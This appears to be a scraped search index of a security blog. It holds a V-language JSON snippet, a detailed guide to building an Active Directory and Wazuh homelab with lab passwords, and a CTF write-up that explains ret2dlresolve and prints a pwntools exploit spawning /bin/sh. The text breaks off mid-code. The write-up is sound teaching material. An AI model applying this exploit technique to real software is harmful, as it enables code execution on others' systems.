\u0026#39;[{\u0026#34;x\u0026#34;:123},{\u0026#34;x\u0026#34;:456}]\u0026#39; foos := json.decode([]foo, sfoos)! println(foos[0].x) println(foos[1].x) encoding json import json struct user { name string score i64 } mut data := map[string]int{} user := \u0026amp;user{ name: \u0026#39;pierre\u0026#39; score: 1024 } data[\u0026#39;x\u0026#39;] = 42 data[\u0026#39;y\u0026#39;] = 360 println(json.encode(data)) // {\u0026#34;x\u0026#34;:42,\u0026#34;y\u0026#34;:360} println(json.encode(user)) // {\u0026#34;name\u0026#34;:\u0026#34;pierre\u0026#34;,\u0026#34;score\u0026#34;:1024} post post analysis now that i\u0026rsquo;ve followed through the introduction replacing the sections in \u0026lsquo;introduction to go\u0026rsquo; with that vlang, the infancy of v has become visible to me as i discover many features and libraris of go are missing. but i belive (at least for now, pray for me) that this would be an opportunity to learn more.\nmeme time if you\u0026rsquo;ve made this far, here\u0026rsquo;s your gift:\n","title":"Black Hat V: Introduction to something that I might or might not do"},{"date":"2025-05-23","image":"","imageAlt":"","link":"https://ashtrace.github.io/posts/building_homelab/","summary":"\u003cp\u003eFresh off my CRTO exam I itched for a local AD lab to practice red-team stuff. GOAD with the ELK/Wazuh extension is (at the time of writing) the best choice (author‚Äôs personal views) for this but I seriously lacked a gigaton of RAM required for 5 (lab) + 1 (extension) VMs, so I went Thanos mode and declared - Fine! I‚Äôll do it myself.\u003c/p\u003e","tags":["active directory"],"text":"fresh off my crto exam i itched for a local ad lab to practice red-team stuff. goad with the elk/wazuh extension is (at the time of writing) the best choice (author‚Äôs personal views) for this but i seriously lacked a gigaton of ram required for 5 (lab) + 1 (extension) vms, so i went thanos mode and declared - fine! i‚Äôll do it myself.\nps: i‚Äôve tried goad (v2) without the elk/wazuh stack. it‚Äôs a stellar lab that hits a lot of awesome topics. if you haven‚Äôt touched it yet, crawl out from under that rock and go check it out.\nmy host device specifications the machine i used to built this lab has\nan amd ryzen 5500u processor - 6 physical (12 logical) cores 32 gigs of ram (which might‚Äôve been huge for ancient times, but since the dawn of llms i feel smol and scared.) domain controller fetch windows server image download the windows server 2022 vhd file from here. create a copy of the downloaded file.\nsetup a vm i used virtualbox to create a new vm named lab-dc and imported the downloaded vhd file. i provided the lab with virtualbox host-only network connection, which can be created leveraging the tools \u0026gt; network window.\nboot up the vm and follow the installation steps:\nselect the locale settings. accept the license agreement.\ncreate a password for the administrator account. i used lab@1234$.\nclick on finish. configure vm addons log-in as administrator.\nfrom the toolbar, select add \u0026lsquo;virtualbox guest-addons\u0026rsquo;. install it to improve the vms execution.\nfollow along after the server vm restarts.\nset the server hostname in the server manager application window, navigate to local server from the left pane. click on computer name under properties. further, click on the change button to change server name. click on ok and restart the vm.\nconfigure the static ip address hit win+r and run ncpa.cpl to open network connections under control panel. view the property of the ethernet interface. click on internet protocol version 4 (tcp/ipv4) and select its properties. set the preferred ip address and set the gateway to host\u0026rsquo;s ip address. set the preferred dns same as the ip address of the server. finally, click on ok. install active directory domain services launch server manager. navigate to manage \u0026gt; add roles and features. continue with default installation. continue clicking on next until select server roles. select active directory domain services and click on add features in the window that pops-up. ensuring that active directory doman services is selected, click on next.\ngo forward with default selection in features and ad ds tab by clicking on next.\non the confirmation tab, select the restart the destination server automatically if required if required and click on install.\nonce greeted with following screen, click on the flag icon. under post-deployment configuration section, click on promote this server to a domain controller.\\\ncreate a new forest and set the appropriate name. click on next.\nlet the forest functional level and domain functional level be at default of windows server 2016. keep the default roles for the dc. set the dsrm password. i used labdsrm@1234$ in the dns options menu, just click next. follow through and click next on verify the netbios domain name.\nunder the paths configuration window go with default settings if no changes are needed.\nclick on next under review options window.\nafter prerequisite checks pass, click on install to continue.\nlet the server restart. once the server restarts, log in as \u0026lt;domain\u0026gt;\\administrator using the password of administrator we setup above while installing the vm (here: lab@1234$). creating domain objects creating organizational units (ous) note: one may skip this and directly add users.\nlaunch server manager and navigate to tools \u0026gt; active directory users and computers right-click on the \u0026lt;domain name\u0026gt; (here and hereafter lab.local for us), select new and click on organizational unit. in the dialog bog, provide with an ou name of your choice and click on ok.\nwe can create nested ous by:\nright-click on the ou of choice, navigate to new \u0026gt; organizational unit and follow the process as above. i created two more ous under our lab-ou namely, users and computers, within users i further created two ous - administrators and researchers. (it made for a good practice)\ncreating a user right-click the administrators ou under lab-ou \u0026gt; users, navigate to new \u0026gt; user.\nfill in the name details. click on next.\nset the password details and select any other configuration required (here: admin@1234). click on next. click on finish. practise by creating multiple users.\npromoting a user to domain administrator right-click on the newly created user and navigate to properties. navigate to member of tab. the screen should display the groups this particular user is part of. click on add.... in the select groups window, within the form-field labeled enter the object names to select (examples), enter domain and click on ok. a dialog box with all group names starting with domain should appear, select the domain admins group and click on ok.\nclick on apply, then click on ok.\ncreating a group navigate to the ou of your choice, right-click and select new \u0026gt; group. add details and click on ok. add group members right-click on the newly created group and select properties. open the members tab, click on add.... a select users, contacts, computers, service accounts, or groups window opens up. within the form field under enter the objct names to select (examples) enter the name of target user (click on check names to correct the format). finally, click on ok. click on apply and then click on ok.\ngroup membership of user can be verified by navigating to user\u0026rsquo;s properties \u0026gt; member of.\ncreating a file share create a new folder (here test-share). navigate to properties \u0026gt; sharing from the context-menu of the folder. click on advanced sharing. enable share this folder. configure share name if needed, click on apply and click on ok. visit the dc and the file-share would be visible. configure file-share permissions navigate to properties \u0026gt; security tab from context-menu of the folder/file share. click on edit. next, click on add... in the select users, computers, service accounts, grups window, search and select the entities. click on ok. change the permissions for the entity from the allow/deny list. finally, click on apply and ok respectively. adding a computer to the ad domain a long time ago in a galaxy far, far away microsoft offered windows vm images to test internet-explorer. the files have since been archived across internet. one may grab the version that suits them here all other places of their choice. i am using virtualbox, so it would be a virtualbox image in my case.\ndownload the archive, extract it and import the (here .ova) file in virtualbox (ctrl+i for importing an image). configure the network adapter of new machine to connect to virtualbox host-only adapter (same as the dc).\nlog into the vm (ieuser:passw0rd!). run (win+r) ncpa.cpl to enter network connections window in control panel \u0026gt; network and interent. configure the dns server to dc ip for the ethernet interface by navigating through properties (as above). although the virtualbox host-only adapter would provide this vm with a range in same subnet as dc through dhcp, i will configure a static ip for this machine (for identification purposes in my later projects).\nlaunch settings and go to accounts \u0026gt; access work or school. click on connect. click on join this device to a local active directory domain. enter the domain name in the join a domain window. click on next. enter the username and password of a domain administrator account to authenticate. click on skip. restart the vm.\nlogin using one of the user accounts created earlier. go to control panel \u0026gt; network and interent \u0026gt; network and sharing center to validate you are connected to the domain. the reachability can be established from the command-prompt as follows:\nthe computer would be visible in the computers section under the active directory users and computers. it can be dragged-and-dropped to any ou we created.\ncreate a group policy back on the dc machine, launch the server manager and go to tools \u0026gt; group policy management. one can navigate through different organizational units (ous), and select the one required.\ngroup policy to create a local administrator account right click on the ou with computers, select create a gpo in this domain, and link it here... provide a name for the new group policy object (gpo) and click on ok. right-click on the newly created gpo and select edit. a group policy management editor window pops-up. go to preferences \u0026gt; control panel settings and select local users and groups. right-click on the table (empty here), and select new \u0026gt; local group. within the new local group properties, set the action to be update. select the group name to be administrators (built-in) from the drop-down menu. click on add under members table. click on the ... button beside name to spawn the select user, computer, or group window. enter the object name (here ashtrace, a domain-joned user i created earlier). click on check names to retrieve the particular user name in correct format. click on ok. click on ok again (notice that the user name is prefixed by the domain name.)\nfinally, click on apply and ok respectively.\nvalidate the gpo by going back to group policy management window, navigate to the ou and select the gpo created. visit the settings tab. titles can be expanded through clicks over them, and it can be observed that the gpo updates the membership of the built-in administrators group.\na window-pop with alert from internet-explorer/edge might spawn complaining website trust issues as the setting page renders an html file. go forth and trust the source, by selecting add in the window itself, to render the contents.\nsyncing group policy updates go to the machine added earlier.\neither reboot it, or spawn a command prompt and type gpupdate /force.\nonce update, open up file explorer. right-click on this pc and select manage.\nwithin the computer management window, go to local users and groups. double-click on groups, followed by a double-click on administrators.\nit is evident that lab\\ashtrace is a member of the builtin-administratosr group now, and their credential can be used to exeute task with administrative privileges.\nadd a server to ad lab use the copy of the windows server vhd image we created earlier, to spawn a new vm machine connected to the virtualbox host-only adapter. note: if you get uuid conflict run c:\\users\\ashtrace\\vms\u0026gt;\u0026quot;c:\\program files\\oracle\\virtualbox\\vboxmanage.exe\u0026quot; internalcommands sethduuid \u0026lt;path-to-vhd-file\u0026gt;\nconfigure the locale settings and setup the administrator password (reference the steps executed when preparing vm for the dc i.e. steps 1-2-3-4).\nonce the vm reboots, through the server manager configure a hostname for the vm (reference step 7). i named the server lab-srv.\nafter the vm restarts again, configure a static ip address and enter the dc\u0026rsquo;s ip for dns (reference step 46, use credential setup for lab server to login).\nopen file explorer. right-click on this pc, select properties. this opens up the about page in settings. scroll-down and click on advanced system settings. in the pop-window go to computer name tab and click on change. switch to domain from workgroup and enter the domain name (here: lab.local), enter the domain administrator credentials. after successful authentication a dialog box with message welcome to domain \u0026lt;domain name\u0026gt; should appear. restart the vm when asked. after reboot, use domain credentials to log onto the server. i used the ashtrace account credentials as it would be part of the built-in administrator group owing the gpo created earlier (ensure that the lab-srv machine is part of the ou to which the gpo has been mapped, if not on the dc, open up server manager \u0026gt; go to active directory users and computers from computers drag the lab-srv machine to the particular ou (lab-ou \u0026gt; computers in this case), back on the lab-srv machine run gpupdate /force and reboot) configure iis service on the newly added server we briefly enable a second network adapter for the vm and allow access to the wi-fi network.\nin the server manager application, select to manage \u0026gt; add roles and features. select role-based or feature-based installation mode and click on next. ensure that the server is selected in server selection window.\nselect web server iis in the server roles window and click on add features in the pop-window that appears. click on next.\nclick on next in features window followed by another next. in the web server role (iis) window\u0026rsquo;s role services list select following under application development (if you want asp.net support) along with the default features selected. click on next. under confirmation allow the wizard to restart the vm if needed and click on install.\nonce the installation succeeds, visit the server from the workstation added earlier to establish if the iis service is up and running.\nadding xdr wazuh is an open-source xdr. it ships ova image among other installation methods.\ndownload the ova file and import it in virtualbox.\nchange the network adapter to host-only, change the graphics controller to vmsvga (under settings \u0026gt; display \u0026gt; graphics controller) and enable the enable hardware clock in utc time feature under settings \u0026gt; system \u0026gt; extended features.\npower-up the vm, login using credentials wazuh-user:wazuh.\nsetup static ip address find the name of the ethernet interface using ip a. [wazuh-user@wazuh-server ~]$ ip a 1: lo: \u0026lt;loopback,up,lower_up\u0026gt; mtu 65536 qdisc noqueue state unknown group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host noprefixroute valid_lft forever preferred_lft forever 2: eth0: \u0026lt;broadcast,multicast,up,lower_up\u0026gt; mtu 1500 qdisc fq_codel state up group default qlen 1000 link/ether 08:00:27:bf:d2:7c brd ff:ff:ff:ff:ff:ff altname enp0s17 inet 192.168.56.107/24 brd 192.168.56.255 scope global eth0 valid_lft forever preferred_lft forever inet6 fe80::a00:27ff:febf:d27c/64 scope link proto kernel_ll valid_lft forever preferred_lft forever check the status of the ethernet interface to identify the file being used to manage it from systemd-networkd by running networkctl status \u0026lt;interface-name\u0026gt; (here and hereafter the interface-name is eth0) [wazuh-user@wazuh-server ~]$ networkctl status eth0 ‚óè 2: eth0 link file: /usr/lib/systemd/network/99-default.link network file: /etc/systemd/network/10-cloud-init-eth0.network state: routable (configured) online state: online type: ether path: pci-0000:00:11.0 driver: e1000 vendor: intel corporation model: 82545em gigabit ethernet controller (copper) (pro/1000 mt single port adapter) alternative names: enp0s17 hardware address: 08:00:27:bf:d2:7c (pcs systemtechnik gmbh) mtu: 1500 (min: 46, max: 16110) qdisc: fq_codel ipv6 address generation mode: eui64 number of queues (tx/rx): 1/1 auto negotiation: yes speed: 1gbps duplex: full port: tp address: 192.168.56.107 (dhcp4 via 192.168.56.100) fe80::a00:27ff:febf:d27c activation policy: up required for online: yes dhcp4 client id: iaid:0x62b7eef0/duid dhcp6 client duid: duid-en/vendor:0000ab116c1ecb03a0526b40 check the value of network file attribute (here: /etc/systemd/network/10-cloud-init-eth0.network). create a file with name \u0026lt;words-between-number-and-interface\u0026gt;.disabled (eg: cloud-init.disabled) [wazuh-user@wazuh-server ~]$ sudo touch /etc/cloud/cloud-init.disabled remove the file discovered as value of network file attribute. [wazuh-user@wazuh-server ~]$ sudo rm /etc/systemd/network/10-cloud-init-eth0.network create a new file /etc/systemd/network/10-static.network [match] name=eth0 [network] address=192.168.56.150/24 gateway=192.168.56.1 dns=8.8.8.8 dns=1.1.1.1 restart the systemd-networkd service. sudo systemctl restart systemd-networkd validate the changes through networkctl status eth0. access the wazuh dashboard visit the url through ip address configured earlier (here: https://192.168.56.107) and credential admin:admin. deploy wazuh agents click on agent management \u0026gt; summary from the hamburger menu icon on the top left of the dashboard. for your first agent deploy new agent page should appear, further agents can be added via clicking on deploy new agent button. under select the package to download and install on your system: select windows: msi 32/64 bits. under server address, add the add ip address configured for this wazuh-server vm. skip optional settings, the command under run the following commands to download and install the agent: fetches the installer from packages.wazuh.com thus for the sake of installation enable a second network adapter on the vms and provide access to internet through bridged adapter. log onto the target vm with administrative account (domain administrator on lab-dc and local administrator, for e.g. the one created earlier through gpo, on the workstation and server lab-srv). open a powershell session with administrative privileges. copy the command from run the following commands to download and install the agent: section of the deploy new agent page and run it in the powershell session. after the command is executed run net start wazuhsvc from the same powershell session. through task manager \u0026gt; services it is evident a certian wazuhsvc service was created and is running. after a while the agent would be visible on the agent management \u0026gt; summary dashboard (first as never connected then as active.)\nrepeat the steps to install the agent on other vm machines in the lab.local domain. finally, the agent management \u0026gt; summary should look like this. finally agument this lab setup by adding on other servers and configurations like delegation, pki etc. and do share the guides and resources with me.\neat\nsleep\nhack\nrepeat\nstay hydrated\ntouch grass\nquick troubleshoot the log of wazuh agent can be viewed from the file c:\\program files (x86)\\ossec-agent\\ossec.log ","title":"AD Homelab 101: Building an Active Directory + XDR homelab in 101 steps"},{"date":"2025-01-14","image":"","imageAlt":"","link":"https://ashtrace.github.io/posts/how_functions_resolve/","summary":"\u003cp\u003eWhile going through another one of those easy challenges (this one dealing with ret2dlresolve), I encountered the following piece of exploit in the writeup which possessed limited verbosity for me and with this level of abstraction I could not figure out what the exploit actually was. Thus I put on my gloves and decided to dig into the dl_resolve process.\u003c/p\u003e","tags":["ctf","linux","pwn","writeup"],"text":"while going through another one of those easy challenges (this one dealing with ret2dlresolve), i encountered the following piece of exploit in the writeup which possessed limited verbosity for me and with this level of abstraction i could not figure out what the exploit actually was. thus i put on my gloves and decided to dig into the dl_resolve process.\nfrom pwn import * elf = context.binary = elf(\u0026#39;./challenge_binary\u0026#39;) p = elf.process() rop = rop(elf) # create a resolver for the system function dlresolve = ret2dlresolvepayload(elf, symbol=\u0026#39;system\u0026#39;, args=[\u0026#39;/bin/sh\u0026#39;]) rop.raw(\u0026#39;a\u0026#39; * 72) # padding rop.read(0, dlresolve.data_addr) # read in the data and structures for the ret2dlresolve rop.ret2dlresolve(dlresolve) # trigger the linker to resolve system p.sendline(rop.chain()) # send the exploit p.sendline(dlresolve.payload) # send the relevant structures p.interactive() ps: no grudges against the author of the writeup or challenge. i am thankful for them to introduce me to a new topic.\ncontext information we are provided with an elf binary (i‚Äôve tried my best to redact the challenge name).\nbinary executable security mitigation enumeration arch: amd64-64-little relro: partial relro stack: no canary found nx: nx enabled pie: no pie (0x400000) runpath: b\u0026#39;./glibc/\u0026#39; stripped: no source code analysis functions main\nint __cdecl main(int argc, const char **argv, const char **envp) { vuln(argc, argv, envp); return 0; } vuln\nssize_t vuln() { char buf[64]; // [rsp+0h] [rbp-40h] byref return read(0, buf, 0xc8ull); } vuln() is vulnerable to out-of-bounds write as it tries to read in 200 bytes within a 40 bytes buffer. exploitation avenues as there is not any target win() functions or call to juicy funtions like system(), we need to perform a ret2dlresolve attack to call system() by abusing the dynamic linking process of an elf.\nduring a ret2dlresolve, the attacker tricks the binary into resolving a function of its choice (such as system) into the plt. this then means the attacker can use the plt function as if it was originally part of the binary, bypassing aslr (if present) and requiring no libc leaks.\ndetailed overview of dynamic linking dynamically-linked elf objects import libc functions when they are first called using the plt and got. during the relocation of a runtime symbol, rip will jump to the plt and attempt to resolve the symbol. during this process a \u0026ldquo;resolver\u0026rdquo; is called.\nexample: calling read() in vuln()\nat vuln+25\n0x000000000040113b \u0026lt;+25\u0026gt;: call 0x401030 \u0026lt;read@plt\u0026gt; at read@plt\n0x401030 \u0026lt;read@plt\u0026gt;: jmp qword ptr [rip+0x2fe2] # 0x404018 \u0026lt;read@got.plt\u0026gt; 0x401036 \u0026lt;read@plt+6\u0026gt;: push 0x0 0x40103b \u0026lt;read@plt+11\u0026gt;: jmp 0x401020 first it jumps to read@got.plt, if the function is already linked this location is populated with the address of the target funtion. but on first call it points to the next instruction in the plt.\nat read@got.plt before first call to read\n0x404018 \u0026lt;read@got.plt\u0026gt;: 0x0000000000401036 as evident from above, at 0x401036 we push a byte (here 0x0) called reloc_arg (it is essentially the index of the elf32_rel/elf64_rela in jmprel table, example: read is at index 0) onto stack and jump to a predefined address (here 0x401020) called default stub. the reloc_arg is multiplied by size of elf64_rela (24) to get reloc_offset from the jmprel base address.\nat the stub, we push link_map ,a list with all the loaded libraries, to the stack and jump to an address loaded from start of the got section.\n0x401020: push qword ptr [rip+0x2fe2] # 0x404008 0x401026: jmp qword ptr [rip+0x2fe4] # 0x404010 here 0x404010 is the start of got section. at the start of got section there is a special address that lies within the ld.so\u0026rsquo;s memory range responsible for loading the dynamically linked libc function.\n0x404010: 0x00007ffff7fe8540 0x7ffff7fd3000 0x7ffff7ff3000 0x20000 0x1000 r-xp /challenge/glibc/ld-linux-x86-64.so.2 this leads to a function call of the form: _dl_runtime_resolve (link_map , rel_offset/relog_arg).\n_dl_runtime_resolve uses link_map list to resolve the symbol. after relocating the symbol, it populates the approriate entry in symtab, the initial call of read will be invoked following which the control returns to the instruction after the original call instruction to this funtion within the code, for every subsequent call the got section has been populated thorugh with the address of the function.\n0x404018 \u0026lt;read@got.plt\u0026gt;: 0x00007ffff7ee1780 understanding resolution sections and structures in elf in order to resolve the functions, there are 3 structures that need to exist within the binary. faking these 3 structures could enable us to trick the linker into resolving a function of our choice, and we can also pass parameters in (such as /bin/sh) once resolved.\nreadelf -d void tag type name/value 0x0000000000000005 (strtab) 0x400390 0x0000000000000006 (symtab) 0x400330 0x0000000000000017 (jmprel) 0x400430 jmprel (.rel.plt) has an offset r_offset that stores the target got address where to store the resolved address and another index r_sym into the symtab (.dynsym) a symbol table, the structure at this offset has a member st_name which stores offset into strtab (.dynstr), a string table, for symbol name.\njmprel (.rel.plt) the jmprel segment stores the relocation table, which maps each entry to a symbol.\nx86 example elf:\nreadelf -r source relocation section \u0026#39;.rel.dyn\u0026#39; at offset 0x2d0 contains 1 entry: offset info type sym.value sym. name 0804bffc 00000206 r_386_glob_dat 00000000 __gmon_start__ relocation section \u0026#39;.rel.plt\u0026#39; at offset 0x2d8 contains 2 entries: offset info type sym.value sym. name 0804c00c 00000107 r_386_jump_slot 00000000 gets@glibc_2.0 0804c010 00000307 r_386_jump_slot 00000000 __libc_start_main@glibc_2.0 amd64 void elf:\nreadelf -r void relocation section \u0026#39;.rela.dyn\u0026#39; at offset 0x400 contains 2 entries: offset info type sym. value sym. name + addend 0000004031f0 000200000006 r_x86_64_glob_dat 0000000000000000 __libc_start_main@glibc_2.2.5 + 0 0000004031f8 000300000006 r_x86_64_glob_dat 0000000000000000 __gmon_start__ + 0 relocation section \u0026#39;.rela.plt\u0026#39; at offset 0x430 contains 1 entry: offset info type sym. value sym. name + addend 000000404018 000100000007 r_x86_64_jump_slo 0000000000000000 read@glibc_2.2.5 + 0 ida listing load:0000000000400400 ; elf rela relocation table load:0000000000400400 f0 31 40 00 00 00 00 00 06 00+elf64_rela \u0026lt;4031f0h, 200000006h, 0\u0026gt; ; r_x86_64_glob_dat __libc_start_main load:0000000000400418 f8 31 40 00 00 00 00 00 06 00+elf64_rela \u0026lt;4031f8h, 300000006h, 0\u0026gt; ; r_x86_64_glob_dat __gmon_start__ load:0000000000400430 ; elf jmprel relocation table load:0000000000400430 18 40 40 00 00 00 00 00 07 00+elf64_rela \u0026lt;404018h, 100000007h, 0\u0026gt; ; r_x86_64_jump_slot read load:0000000000400430 00 00 01 00 00 00 00 00 00 00+load ends these entries are of type elf32_rel (in x86 executable) and elf64_rela (in amd64 executable):\nx86\ntypedef uint32_t elf32_addr; typedef uint32_t elf32_word; typedef struct { elf32_addr r_offset; /* address */ elf32_word r_info; /* relocation type and symbol index */ } elf32_rel; /* how to extract and insert information held in the r_info field. */ #define elf32_r_sym(val) ((val) \u0026gt;\u0026gt; 8) #define elf32_r_type(val) ((val) \u0026amp; 0xff) the column name coresponds to our symbol name. the offset is the got entry for our symbol. info stores additional metadata. elf32_r_sym stores the index of the elf32_sym(see symtab section definition below) entry in symtab (symbol table) for the specified symbol.\ndue to value of info (visible in .rel.plt dump) the r_sym of gets is 1 as 0x107 \u0026raquo; 8 = 1.\namd64 (cleaner definition further below)\nusing elf64_addr = uint64_t; using elf64_xword = uint64_t; struct elf64_rela { elf64_addr r_offset; // location (file byte offset, or program virtual addr). elf64_xword r_info; // symbol table index and type of relocation to apply. // these accessors and mutators correspond to the elf64_r_sym, elf64_r_type, // and elf64_r_info macros defined in the elf specification: elf64_word getsymbol() const { return (r_info \u0026gt;\u0026gt; 32); } elf64_word gettype() const { return (elf64_word)(r_info \u0026amp; 0xffffffffl); } void setsymbol(elf64_word s) { setsymbolandtype(s, gettype()); } void settype(elf64_word t) { setsymbolandtype(getsymbol(), t); } void setsymbolandtype(elf64_word s, elf64_word t) { r_info = ((elf64_xword)s \u0026lt;\u0026lt; 32) + (t \u0026amp; 0xffffffffl); } }; the r_sym value of read (in void elf) would be 1 (0x000100000007 \u0026raquo; 32).\nthe type r_386_jump_slot and r_x86_64_jump_slot means that the entry is for got section.\neg: ida\u0026rsquo;s listing of jumprel of example amd64 elf.\nload:04005c0 ; elf jmprel relocation table load:04005c0 elf64_rela \u0026lt;404018h, 200000007h, 0\u0026gt; ; r_x86_64_jump_slot write load:04005d8 elf64_rela \u0026lt;404020h, 300000007h, 0\u0026gt; ; r_x86_64_jump_slot strlen load:04005f0 elf64_rela \u0026lt;404028h, 400000007h, 0\u0026gt; ; r_x86_64_jump_slot setbuf load:0400608 elf64_rela \u0026lt;404030h, 500000007h, 0\u0026gt; ; r_x86_64_jump_slot read here the first value is r_offset (offset into got), the second value is r_info, the third value is r_addend (available in another definition of elf64_rela mentioned further below).\nnotice how the second value mentions the offset within the symtab table with the highest-order-byte - 2, 3, 4, 5 while the lowest-order-byte represents type 7 ie. r_x86_64_jump_slot.\ncleaner definition of elf64_rela typedef struct { elf64_addr r_offset; /* 64 bit - address */ elf64_xword r_info; /* 64 bit - relocation type and symbol index */ elf64_sxword r_addend; /* 64 bit - addend */ } elf64_rela; // 24 bytes /* how to extract and insert information held in the r_info field.*/ #define elf64_r_sym(i) ((i) \u0026gt;\u0026gt; 32) #define elf64_r_type(i) ((i) \u0026amp; 0xffffffff) #define elf64_r_info(sym,type) ((((elf64_xword) (sym)) \u0026lt;\u0026lt; 32) + (type)) strtab (.dynstr) strtab is a simple table that stores the strings for symbols name.\nida\u0026rsquo;s listing for strtab for void\nload:0000000000400390 ; elf string table load:0000000000400390 00 unk_400390 db 0 ; data xref: load:0000000000400348‚Üëo load:0000000000400390 ; load:0000000000400360‚Üëo load:0000000000400390 ; load:0000000000400378‚Üëo load:0000000000400390 ; load:00000000004003e0‚Üìo load:0000000000400390 ; load:00000000004003f0‚Üìo load:0000000000400391 72 65 61 64 00 aread db \u0026#39;read\u0026#39;,0 ; data xref: load:0000000000400348‚Üëo load:0000000000400396 5f 5f 6c 69 62 63 5f 73 74 61+alibcstartmain db \u0026#39;__libc_start_main\u0026#39;,0 ; data xref: load:0000000000400360‚Üëo load:00000000004003a8 6c 69 62 63 2e 73 6f 2e 36 00 alibcso6 db \u0026#39;libc.so.6\u0026#39;,0 ; data xref: load:00000000004003e0‚Üìo load:00000000004003b2 47 4c 49 42 43 5f 32 2e 32 2e+aglibc225 db \u0026#39;glibc_2.2.5\u0026#39;,0 ; data xref: load:00000000004003f0‚Üìo load:00000000004003be 2e 2f 67 6c 69 62 63 2f 00 aglibc db \u0026#39;./glibc/\u0026#39;,0 load:00000000004003c7 5f 5f 67 6d 6f 6e 5f 73 74 61+agmonstart db \u0026#39;__gmon_start__\u0026#39;,0 ; data xref: load:0000000000400378‚Üëo symtab (.dynsym) this table holds relevant symbol information.\nx86 each entry is a elf32_sym structure and its size is 16 bytes.\ntypedef struct { elf32_word st_name ; /* symbol name (string tbl index) -4b*/ elf32_addr st_value ; /* symbol value -4b*/ elf32_word st_size ; /* symbol size -4b*/ unsigned char st_info ; /* symbol type and binding-1b */ unsigned char st_other ; /* symbol visibility under glibc\u0026gt;=2.2 -1b */ elf32_section st_shndx ; /* section index -2b*/ } elf32_sym; amd64 contains a symbol table using elf64_sym structures. every structure associates a symbolic name with a piece of code elsewhere in the binary.\ntypedef struct { elf64_word st_name; /* 32bit - symbol name (string tbl index) */ unsigned char st_info; /* symbol type and binding */ unsigned char st_other; /* symbol visibility */ elf64_section st_shndx; /* 16 bits - section index */ elf64_addr st_value; /* 64 bits - symbol value */ elf64_xword st_size; /* 64 bits - symbol size */ } elf64_sym; // 24 bytes st_name: it acts as a string table index. it will be used to locate the right string in the strtab section.\nst_info: symbol‚Äôs type and binding attributes.\nst_other: symbol‚Äôs visibility.\nst_shndx: the relevant section header table index.\nst_value: the value of the associated symbol.\nst_size: the symbol‚Äôs size. if the symbol has no size or the size is unknown, it contains 0.\nida listing void binary\nload:0000000000400330 ; elf symbol table load:0000000000400330 00 00 00 00 00 00 00 00 00 00+elf64_sym \u0026lt;0\u0026gt; load:0000000000400348 01 00 00 00 12 00 00 00 00 00+elf64_sym \u0026lt;offset aread - offset unk_400390, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;read\u0026#34; load:0000000000400360 06 00 00 00 12 00 00 00 00 00+elf64_sym \u0026lt;offset alibcstartmain - offset unk_400390, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;__libc_start_main\u0026#34; load:0000000000400378 37 00 00 00 20 00 00 00 00 00+elf64_sym \u0026lt;offset agmonstart - offset unk_400390, 20h, 0, 0, 0, 0\u0026gt; ; \u0026#34;__gmon_start__ ida listing example binary\nload:04003d8 ; elf symbol table load:04003d8 elf64_sym \u0026lt;0\u0026gt; load:04003f0 elf64_sym \u0026lt;offset alibcstartmain - offset unk_4004b0, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;__libc_start_main\u0026#34; load:0400408 elf64_sym \u0026lt;offset awrite - offset unk_4004b0, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;write\u0026#34; load:0400420 elf64_sym \u0026lt;offset astrlen - offset unk_4004b0, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;strlen\u0026#34; load:0400438 elf64_sym \u0026lt;offset asetbuf - offset unk_4004b0, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;setbuf\u0026#34; load:0400450 elf64_sym \u0026lt;offset aread - offset unk_4004b0, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;read\u0026#34; the most important value here is st_name as this gives the offset in strtab of the symbol name. the other fields are not relevant to the exploit itself.\njmprel, symtab and strtab for void elf base section addresses\nreadelf -d void tag type name/value 0x0000000000000005 (strtab) 0x400390 0x0000000000000006 (symtab) 0x400330 0x0000000000000017 (jmprel) 0x400430 jmprel entry for read\n(gdb) x/2gx 0x0000000000400430 + 0 0x400430: 0x0000000000404018 0x0000000100000007 |__ r_offset |___ r_info r_sym = (r_info \u0026raquo; 32) = 1\nsymtab at index 1\nx/6wx 0x400330 + 1 * 24 0x400348: 0x00000001 0x00000012 0x00000000 0x00000000 0x400358: 0x00000000 0x00000000 symtab base + index * size of elf64_sym st_name = 1 strtab at index 1\nx/s 0x0000000000400390 + 0x00000001 0x400391: \u0026#34;read\u0026#34; tl;dr function resolution pseudocode exmaple: calling read in x86 elf\n_dl_runtime_resolve(link_map, reloc_arg) { uintptr_t reloc_offset = reloc_arg * sizeof(elf64_rela); // reloc_arg is pushed in .plt section elf64_rela * rel_entry = jmprel + reloc_offset ; elf64_sym * sym_entry = \u0026amp;symtab[elf64_r_sym(rel_entry-\u0026gt;r_info)]; char * sym_name = strtab + sym_entry-\u0026gt;st_name ; _search_for_symbol_(link_map, sym_name); // invoke initial read call now that symbol is resolved read(0, buf, 0x100); } ret2dlresolve use .bss section to create fake entries, it is closer to the elf in memory compared to the stack.\nstep 1 we need to fake an elf64_rela structure and an elf64_sym structure with following characteristics\nfake elf64_rela (jmprel/.rel.plt) structure it must have a writeable r_offset area where _dl_runtime_resolve will write the address of system(). in the r_info attribute the lower 4 bytes (32 bits) must be equal to 7 ie. r_x86_64_jump_slot, while the higher 4 bytes should be constructed such that (r_info \u0026gt;\u0026gt; 32) * 24 (r_sym value * size of elf64_sym as r_sym is just index) when added to symtab address, points to fake elf64_sym. fake elf64_sym (symtab/.dynsym) structure the st_name value when added to strtab (.dynstr) address points to \u0026lsquo;system\u0026rsquo; string. step 2 with the fake structures in place, we calculate reloc_arg (offset usually pushed in a functions\u0026rsquo;s .plt section) from jmprel (.rel.plt) address to point to our fake elf64_rela structure.\nnext, we push the fake value of reloc_arg onto stack and transfer control to default stub at the start of .plt section to let dl_resolve do its magic.\ncrafting exploit as .bss section is writable at runtime, we use this space to create our fake structures.\nnote: make sure that index to fake .dynsym entry must be multiple of 24. if on dividing the address difference between our fake entry and symtab base we get a fraction this leads to variance in resultant address when recalculated by _dl_fixup during resolution as only the integer part would be stored in r_info as index.\nimport pwn #pwn.context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, 